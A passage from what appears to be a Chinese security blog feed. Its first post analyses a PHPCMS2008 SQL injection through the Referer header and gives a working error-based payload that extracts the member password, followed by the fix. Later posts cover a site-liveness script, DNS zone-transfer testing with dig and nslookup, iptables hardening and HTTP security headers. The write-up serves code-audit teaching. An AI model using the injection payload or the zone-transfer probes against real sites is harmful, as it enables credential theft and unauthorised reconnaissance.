      <url>/2016/09/22/PHPCMS2008%E5%B9%BF%E5%91%8A%E6%A8%A1%E6%9D%BFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><p>PHPCMS2008由于广告模块取<code>referer</code>不严，导致一处sql注入漏洞.可以得到管理员用户名与密码，攻击者登录后台后可能会获取webshell，对服务器进行进一步的渗透。</p>
<a id="more"></a>
<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h1><p><strong>漏洞产生的位置：</strong><br><code>/ads/include/ads_place.class.php</code>的<code>show</code>方法中.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function show($placeid)</div><div class="line">		...</div><div class="line">		if($adses[0][&apos;option&apos;])</div><div class="line">		&#123;</div><div class="line">			foreach($adses as $ads)</div><div class="line">			&#123;</div><div class="line">				$contents[] = ads_content($ads, 1);</div><div class="line">				$this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘$this-&gt;referrer’,‘$time’,,’0’)”);</div><div class="line">				$template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	...</div></pre></td></tr></table></figure>
<p>sql语句中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘$this-&gt;referrer’,‘$time’,,’0’)”);</div></pre></td></tr></table></figure>
<p>这里<code>$this-&gt;referrer</code>通过<code>this</code>方法直接将HTTP请求头中的<code>referer</code>字段插入到数据库中,没有做任何过滤措施。(这个this方法是PHPCMS里面直接封装的)。</p>
<p>所以现在已经找到漏洞点，下一步就是找包含漏洞的用户可控的页面。如果漏洞是用户不可控的，比如只能管理员利用，那就相当的鸡肋了。</p>
<p>这里使用<code>回溯</code>的方法，看看哪些页面调用了它。</p>
<p>页面<code>/ads/include/commom.inc.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">...</div><div class="line">require MOD_ROOT.&apos;include/ads_place.class.php&apos;;</div><div class="line">require MOD_ROOT.&apos;include/ads.class.php&apos;;</div><div class="line">...</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>在往上看看谁调用了<code>/ads/include/commom.inc.php</code></p>
<p><code>/ads/ad.php</code>文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">...</div><div class="line">require &apos;./include/common.inc.php&apos;;</div><div class="line">...</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><code>ad.php</code>文件为用户可控文件，但<code>ad.php</code>有时不能访问，继续向上查找<code>/data/js.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">chdir(‘../ads/’);</div><div class="line">require ‘./ad.php’;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>在用户访问首页时，会调用<code>js.php</code>，通过该文件可以提交有害字段，然后通过逐层调用，传入字段<code>referer</code>到危险方法<code>show</code>，引入SQL注入攻击。</p>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>修改请求头中的<code>referer</code>字段的话有很多种，比如burpsuite，Tamper Data…</p>
<p>这里直接使用火狐的Tamper Data进行修改：</p>
<p>点击Start Tamper,然后访问<code>http://your-addr/data/js.php?id=1</code></p>
<p>这时候Tamper Data会跳出来,在右边框内，点击右键，添加一个<code>element</code>值填写payload</p>
<pre><code>referer=1’, (SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), ‘0’)#
</code></pre><p>这里我解释一下：因为漏洞的sql语句是<code>INSERT</code>是不回显的，所以可以使用盲注，这里的payload使用的<code>floor</code>报错注入。floor报错注入原理请参考：<a href="http://byd.dropsec.xyz/2016/08/02/Mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">floor函数用法</a></p>
<p>把这个payload带入sql语句中是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘1’,‘$time’,(SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), ‘0’)#,’0’)”);</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/phpcms_ad_sql_injection2.png" alt=""></p>
<h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>对相关字段进行过滤处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$referer = safe_replace($this-&gt;referer);</div><div class="line">	$this-&gt;db-&gt;query(&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&apos;$ads[adsid]&apos;, &apos;$_username&apos;, &apos;$ip&apos;, &apos;$referer&apos;, &apos;$time&apos;, &apos;0&apos;)&quot;);</div><div class="line">$template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;;</div></pre></td></tr></table></figure>
<p>这里<code>safe_replace</code>是PHPCMS2008封装的过滤函数。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python实现批量网站存活检测]]></title>
      <url>/2016/09/21/Python%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E7%BD%91%E7%AB%99%E5%AD%98%E6%B4%BB%E6%A3%80%E6%B5%8B/</url>
      <content type="html"><![CDATA[<p>做渗透测试的时候，有个比较大的项目，里面有几百个网站，这样你必须首先确定哪些网站是正常，哪些网站是不正常的。所以自己就编了一个小脚本，为以后方便使用。</p>
<a id="more"></a>
<p>具体实现的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@博客：http://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line"></div><div class="line">import requests</div><div class="line">import sys</div><div class="line">f = open(&apos;url.txt&apos;, &apos;r&apos;)</div><div class="line">url = f.readlines()</div><div class="line">length = len(url)</div><div class="line">url_result_success=[]</div><div class="line">url_result_failed=[]</div><div class="line">for i in range(0,length):</div><div class="line">    try:</div><div class="line">        response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5)</div><div class="line">        if response.status_code != 200:</div><div class="line">            raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code))</div><div class="line">    except requests.RequestException as e:</div><div class="line">        url_result_failed.append(url[i])</div><div class="line">        continue</div><div class="line">    url_result_success.append(url[i])</div><div class="line">f.close()</div><div class="line">result_len = len(url_result_success)</div><div class="line">for i in range(0,result_len):</div><div class="line">    print &apos;网址%s&apos; % url_result_success[i].strip()+&apos;打开成功&apos;</div></pre></td></tr></table></figure>
<p>测试结果如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%AD%98%E6%B4%BB.png" alt=""></p>
<p><strong>遇到的问题：</strong></p>
<p>刚开始测试的时候，遇到只要是不能错误，或者不存在的，直接报错停止程序。后来发现是因为<code>response.status_code != 200</code>这里取状态码的时候错误。</p>
<p>因为有的网站不能打开的话，不会返回状态码。所以程序就不知道<code>！==200</code>怎么处理了。</p>
<p><strong>解决方法：</strong></p>
<p>使用<code>try except else捕捉异常</code></p>
<p>具体代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">        response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5)</div><div class="line">        if response.status_code != 200:</div><div class="line">            raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code))</div><div class="line">    except requests.RequestException as e:</div><div class="line">        url_result_failed.append(url[i])</div><div class="line">        continue</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DNS域传送漏洞]]></title>
      <url>/2016/09/20/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>DNS是网络中应用非常广泛的服务之一，是一种底层的网络基础服务。它的主要作用是提供域名（如baidu.com）和IP直接解析关系的功能，只要我们的网络通信中存在域名，就会涉及到DNS服务。<br><a id="more"></a><br>DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送（zone transfer）操作是后果最为严重的错误配置之一。</p>
<p>简单点说就是DNS服务器配置不当，导致可以将该DNS服务器上的数据传送到其他的主机上。恶意攻击者可以通过此种方法，获取某个域名的所有子域名及对应IP地址。</p>
<h1 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h1><h2 id="1、Linux-dig测试方法"><a href="#1、Linux-dig测试方法" class="headerlink" title="1、Linux dig测试方法"></a>1、Linux dig测试方法</h2><p>dig是Linux上常用的dns工具，如果没有此命令，可以使用如下命令安装（Centos系统）：</p>
<blockquote>
<p>yum install bind-utils</p>
</blockquote>
<p>使用dig进行DNS域传送，首先要找到主机的SOA或者NS记录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">[root@user ~]# dig soa xxx.com</div><div class="line"> </div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; soa 3mc2.com</div><div class="line">;; global options: +cmd</div><div class="line">;; Got answer:</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 2865</div><div class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</div><div class="line"> </div><div class="line">;; QUESTION SECTION:</div><div class="line">;3mc2.com.            IN    SOA</div><div class="line"> </div><div class="line">;; ANSWER SECTION:</div><div class="line">xxx.com.        600    IN    SOA    f1g1ns1.dnspod.net. freednsadmin.dnspod.com. 1411491105 3600 180 1209600 180</div><div class="line"> </div><div class="line">;; Query time: 504 msec</div><div class="line">;; SERVER: 223.5.5.5#53(223.5.5.5)</div><div class="line">;; WHEN: Wed Mar 11 11:26:05 2015</div><div class="line">;; MSG SIZE  rcvd: 100</div></pre></td></tr></table></figure>
<p>显示结果忽略注释部分，我们可以看到SOA记录有两个服务器：<code>f1g1ns1.dnspod.net</code> 和 <code>freednsadmin.dnspod.com</code>，然后我们就可以通过如下命令查看DNS是否存在DNS域传送漏洞，如果存在，则可以找到xxx.com的所有子域名和IP对应关系：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@user ~]# dig axfr xxx.com @f1g1ns1.dnspod.net</div><div class="line"> </div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; axfr xxx.com @f1g1ns1.dnspod.net</div><div class="line">;; global options: +cmd</div><div class="line">; Transfer failed.</div></pre></td></tr></table></figure>
<p>以上是不能进行DNS域传送的结果，下图是可以进行DNS域传送的结果：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/DNS%E5%9F%9F%E4%BC%A0%E9%80%811.png" alt=""></p>
<h2 id="2、Windows-nslookup命令"><a href="#2、Windows-nslookup命令" class="headerlink" title="2、Windows nslookup命令"></a>2、Windows nslookup命令</h2><p>nslookup是windows下自带的DNS测试工具，可以通过此命令进行DNS域传送测试：</p>
<p>主要方法和dig类似，先找出ns服务器，然后执行<code>ls -d</code> 列出子域等信息（以下是不能传送的情形）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">[c:\~]$ nslookup</div><div class="line">默认服务器:  public1.alidns.com</div><div class="line">Address:  223.5.5.5</div><div class="line"> </div><div class="line">&gt; set type=ns</div><div class="line">&gt; xxx.com</div><div class="line">非权威应答:</div><div class="line">服务器:  public1.alidns.com</div><div class="line">Address:  223.5.5.5</div><div class="line"> </div><div class="line">xxx.com    nameserver = f1g1ns1.dnspod.net</div><div class="line">xxx.com    nameserver = f1g1ns2.dnspod.net</div><div class="line">&gt; server f1g1ns2.dnspod.net</div><div class="line">默认服务器:  f1g1ns2.dnspod.net</div><div class="line">Addresses:  115.236.137.40</div><div class="line">      112.90.82.194</div><div class="line">      101.226.30.224</div><div class="line">      182.140.167.188</div><div class="line">&gt; set type=any</div><div class="line">&gt; ls -d 3mc2.com</div><div class="line">*** 无法列出域 xxx.com: BAD ERROR VALUE</div><div class="line">DNS 服务器拒绝将区域 3mc2.com 传送到您的计算机。如果这不正确，</div><div class="line">请检查 IP 地址 223.5.5.5 的 DNS 服务器上 3mc2.com 的</div><div class="line">区域传送安全设置。</div></pre></td></tr></table></figure>
<p>正常存在DNS域传送漏洞的返回结果如下所示：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/DNS%E5%9F%9F%E4%BC%A0%E9%80%812.png" alt=""></p>
<h2 id="3、使用dnsenum-pl和Dnswalk测试："><a href="#3、使用dnsenum-pl和Dnswalk测试：" class="headerlink" title="3、使用dnsenum.pl和Dnswalk测试："></a>3、使用dnsenum.pl和Dnswalk测试：</h2><p>现成工具，不做介绍，Kali里边有</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> DNS域传送 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IPtables入门教程]]></title>
      <url>/2016/09/03/IPtables%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="0x00-iptables介绍"><a href="#0x00-iptables介绍" class="headerlink" title="0x00 iptables介绍"></a>0x00 iptables介绍</h1><p><font color="#000ff">防火墙，其实说白了讲，就是用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络的边缘。而我们的任务就是需要去定义到底防火墙如何工作，这就是防火墙的策略，规则，以达到让它对出入网络的IP、数据进行检测。</font><br><a id="more"></a></p>
<p>linux的包过滤功能，即linux防火墙，它由<code>netfilter</code> 和 <code>iptables</code> 两个组件组成。</p>
<p>netfilter 组件也称为内核空间，是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。</p>
<p>iptables 组件是一种工具，也称为用户空间，它使插入、修改和除去信息包过滤表中的规则变得容易。</p>
<h1 id="0x01-iptables的结构"><a href="#0x01-iptables的结构" class="headerlink" title="0x01 iptables的结构"></a>0x01 iptables的结构</h1><p>iptables的结构：</p>
<p>iptables -&gt; Tables -&gt; Chains -&gt; Rules<br>简单地讲，tables由chains组成，而chains又由rules组成。iptables 默认有四个表Filter, NAT, Mangle, Raw，其对于的链如下图</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/iptables1.jpg" alt=""></p>
<h1 id="0x02-filter表详解"><a href="#0x02-filter表详解" class="headerlink" title="0x02 filter表详解"></a>0x02 filter表详解</h1><p><strong>1. 在iptables中，filter表起过滤数据包的功能，它具有以下三种内建链：</strong></p>
<ol>
<li>INPUT链 – 处理来自外部的数据。 </li>
<li>OUTPUT链 – 处理向外发送的数据。 </li>
<li>FORWARD链 – 将数据转发到本机的其他网卡设备上。 </li>
</ol>
<p><strong>2. 数据流向场景</strong></p>
<ol>
<li>访问本机：在INPUT链上做过滤</li>
<li>本机访问外部：在OUTPUT链上做过滤</li>
<li>通过本机访问其他主机:在FORWARD链上做过滤</li>
</ol>
<p><strong>3. Iptables基本操作</strong></p>
<ol>
<li>启动iptables：service iptables start</li>
<li>关闭iptables：service iptables stop</li>
<li>重启iptables：service iptables restart</li>
<li>查看iptables状态：service iptables status</li>
<li>保存iptables配置：service iptables save</li>
<li>Iptables服务配置文件：/etc/sysconfig/iptables-config</li>
<li>Iptables规则保存文件：/etc/sysconfig/iptables</li>
<li>打开iptables转发：echo “1”&gt; /proc/sys/net/ipv4/ip_forward</li>
</ol>
<h1 id="0x03-iptables命令参考"><a href="#0x03-iptables命令参考" class="headerlink" title="0x03 iptables命令参考"></a>0x03 iptables命令参考</h1><p>命令：</p>
<p>iptables [ -t 表名] 命令选项 [链名] [条件匹配] [-j 目标动作或跳转] </p>
<p><strong>1. 表名</strong></p>
<p>表名：Filter, NAT, Mangle, Raw</p>
<p>起包过滤功能的为表Filter，可以不填，不填默认为Filter</p>
<p><strong>2. 命令选项</strong></p>
<p>选项名     功能及特点</p>
<p>-A        在指定链的末尾添加（–append）一条新的规则</p>
<p>-D        删除（–delete）指定链中的某一条规则，按规则序号或内容确定要删除的规则</p>
<p>-I        在指定链中插入（–insert）一条新的规则，默认在链的开头插入</p>
<p>-R        修改、替换（–replace）指定链中的一条规则，按规则序号或内容确定</p>
<p>-L        列出（–list）指定链中的所有的规则进行查看，默认列出表中所有链的内容</p>
<p>-F        清空（–flush）指定链中的所有规则，默认清空表中所有链的内容</p>
<p>-N        新建（–new-chain）一条用户自己定义的规则链</p>
<p>-X        删除指定表中用户自定义的规则链（–delete-chain）</p>
<p>-P        设置指定链的默认策略（–policy）</p>
<p>-n        用数字形式（–numeric）显示输出结果，若显示主机的 IP地址而不是主机名</p>
<p>-P        设置指定链的默认策略（–policy）</p>
<p>-v        查看规则列表时显示详细（–verbose）的信息</p>
<p>-V        查看iptables命令工具的版本（–Version）信息</p>
<p>-h        查看命令帮助信息（–help）</p>
<p>–line-number    查看规则列表时，同时显示规则在链中的顺序号</p>
<p><strong>3. 链名</strong></p>
<p>可以根据数据流向来确定具体使用哪个链，在Filter中的使用情况如下：</p>
<ol>
<li>INPUT链 – 处理来自外部的数据。 </li>
<li>OUTPUT链 – 处理向外发送的数据。 </li>
<li>FORWARD链 – 将数据转发到本机的其他网卡设备上。</li>
</ol>
<p><strong>4. 条件匹配</strong></p>
<p>条件匹配分为基本匹配和扩展匹配，扩展匹配又分为隐式扩展和显示扩展。</p>
<p>a)基本匹配包括：</p>
<p>匹配参数    说明</p>
<p>-p        指定规则协议，如tcp, udp,icmp等，可以使用all来指定所有协议</p>
<p>-s        指定数据包的源地址参数，可以使IP地址、网络地址、主机名</p>
<p>-d        指定目的地址</p>
<p>-i        输入接口</p>
<p>-o        输出接口</p>
<p>b)隐式扩展包括：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/iptables2.jpg" alt=""></p>
<p>c)常用显式扩展</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/iptables3.jpg" alt=""></p>
<p><strong>5. 目标值</strong></p>
<p>数据包控制方式包括四种为：</p>
<pre><code>ACCEPT：允许数据包通过。 
DROP：直接丢弃数据包，不给出任何回应信息。 
REJECT：拒绝数据包通过，必须时会给数据发送端一个响应信息。 
LOG：在/var/log/messages 文件中记录日志信息，然后将数据包传递给下一条规则。 
QUEUE：防火墙将数据包移交到用户空间 
RETURN：防火墙停止执行当前链中的后续Rules，并返回到调用链(the calling chain) 
</code></pre><h1 id="0x04-Iptables常见命令"><a href="#0x04-Iptables常见命令" class="headerlink" title="0x04 Iptables常见命令"></a>0x04 Iptables常见命令</h1><ol>
<li><p>删除iptables现有规则</p>
<blockquote>
<p>iptables –F </p>
</blockquote>
</li>
<li><p>查看iptables规则</p>
<blockquote>
<p>iptables –L（iptables –L –v -n） </p>
</blockquote>
</li>
<li><p>增加一条规则到最后</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>添加一条规则到指定位置</p>
<blockquote>
<p>iptables -I INPUT 2 -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>删除一条规则</p>
<blockquote>
<p>iptabels -D INPUT 2 </p>
</blockquote>
</li>
<li><p>修改一条规则</p>
<blockquote>
<p>iptables -R INPUT 3 -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>设置默认策略</p>
<blockquote>
<p>iptables -P INPUT DROP </p>
</blockquote>
</li>
<li><p>允许远程主机进行SSH连接</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT</p>
<p>iptables -A OUTPUT -o eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>允许本地主机进行SSH连接</p>
<blockquote>
<p>iptables -A OUTPUT -o eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT</p>
<p>iptables -A INTPUT -i eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>允许HTTP请求</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT</p>
<p>iptables -A OUTPUT -o eth0 -p tcp –sport 80 -m state –state ESTABLISHED -j ACCEPT </p>
</blockquote>
</li>
<li><p>限制ping 192.168.146.3主机的数据包数，平均2/s个，最多不能超过3个</p>
<blockquote>
<p>iptables -A INPUT -i eth0 -d 192.168.146.3 -p icmp –icmp-type 8 -m limit –limit 2/second –limit-burst 3 -j ACCEPT </p>
</blockquote>
</li>
<li><p>限制SSH连接速率(默认策略是DROP)</p>
<blockquote>
<p>iptables -I INPUT 1 -p tcp –dport 22 -d 192.168.146.3 -m state –state ESTABLISHED -j ACCEPT</p>
<p>iptables -I INPUT 2 -p tcp –dport 22 -d 192.168.146.3 -m limit –limit 2/minute –limit-burst 2 -m state –state NEW -j ACCEPT </p>
</blockquote>
</li>
</ol>
<h1 id="0x05-使用iptables抵抗常见攻击"><a href="#0x05-使用iptables抵抗常见攻击" class="headerlink" title="0x05 使用iptables抵抗常见攻击"></a>0x05 使用iptables抵抗常见攻击</h1><p><strong>1.防止syn攻击</strong></p>
<p>思路一：限制syn的请求速度（这个方式需要调节一个合理的速度值，不然会影响正常用户的请求）</p>
<pre><code>iptables -N syn-flood 
iptables -A INPUT -p tcp --syn -j syn-flood 
iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN 
iptables -A syn-flood -j DROP 
</code></pre><p>思路二：限制单个ip的最大syn连接数</p>
<pre><code>iptables –A INPUT –i eth0 –p tcp --syn -m connlimit --connlimit-above 15 -j DROP 
</code></pre><p><strong>2. 防止DOS攻击</strong></p>
<p>利用recent模块抵御DOS攻击</p>
<pre><code>iptables -I INPUT -p tcp -dport 22 -m connlimit --connlimit-above 3 -j DROP 
单个IP最多连接3个会话

iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH  
只要是新的连接请求，就把它加入到SSH列表中

Iptables -I INPUT -p tcp --dport 22 -m state NEW -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP  
5分钟内你的尝试次数达到3次，就拒绝提供SSH列表中的这个IP服务。被限制5分钟后即可恢复访问。
</code></pre><p><strong>3. 防止单个ip访问量过大</strong></p>
<pre><code>iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP 
</code></pre><p><strong>4. 木马反弹</strong></p>
<pre><code>iptables –A OUTPUT –m state --state NEW –j DROP 
</code></pre><p><strong>5. 防止ping攻击</strong></p>
<pre><code>iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/m -j ACCEPT 
</code></pre><p>参考资料：<a href="http://drops.wooyun.org/tips/1424" target="_blank" rel="external">乌云-iptables基础知识</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> iptables </tag>
            
            <tag> linux </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTP header 安全配置]]></title>
      <url>/2016/09/02/header%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<p>现代浏览器提供了一些安全相关的响应头，使用这些响应头一般只需要修改服务器配置即可，不需要修改程序代码，成本很低。</p>
<a id="more"></a>
<p>安全方面的 HTTP Header</p>
<p><strong>防御 XSS (Cross Site Scripting)：</strong></p>
<ul>
<li>Content-Security-Policy</li>
<li>Set-Cookie: HttpOnly</li>
<li>X-XSS-Protection</li>
<li>X-Download-Options</li>
</ul>
<p>Nginx在nginx.conf的server段中加入：</p>
<blockquote>
<p>add_header X-XSS-Protection “1; mode=block”;</p>
</blockquote>
<p>在Nginx.conf的server段加入：</p>
<blockquote>
<p>add_header Content-Security-Policy: script-src &#039;self&#039; <a href="https://apis.google.com" target="_blank" rel="external">https://apis.google.com</a></p>
</blockquote>
<p><strong>防御 Clickjacking：</strong></p>
<ul>
<li>X-Frame-Options</li>
</ul>
<blockquote>
<p>add_header X-Frame-Options: DENY</p>
</blockquote>
<p>Nginx中编辑nginx.conf ，在server段加入：</p>
<blockquote>
<p>add_header X-Frame-Options “SAMEORIGIN”;</p>
</blockquote>
<p><strong>强化 HTTPS机制：</strong></p>
<ul>
<li>Set-Cookie: Secure</li>
<li>Strict-Transport-Security</li>
</ul>
<p>在Nginx.conf的server段加入：</p>
<blockquote>
<p>add_header Strict-Transport-Security “max-age=31536000; includeSubdomains;”;</p>
</blockquote>
<p><strong>避免浏览器误判文件形式：</strong></p>
<ul>
<li>X-Content-Type-Options</li>
</ul>
<p>在Nginx.conf的server段加入：</p>
<blockquote>
<p>add_header X-Content-Type-Options nosniff;</p>
</blockquote>
<p><strong>保证网站资源被任意存取：</strong></p>
<ul>
<li>Access-Control-Allow-Origin（此 header 若設定錯誤會適得其反！）</li>
<li>X-Permitted-Cross-Domain-Policies</li>
</ul>
<blockquote>
<p>add_header ccess-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="external">http://foo.example</a><br>Access-Control-Allow-Origin: *</p>
</blockquote>
<p><strong>Cookie保护</strong></p>
<ul>
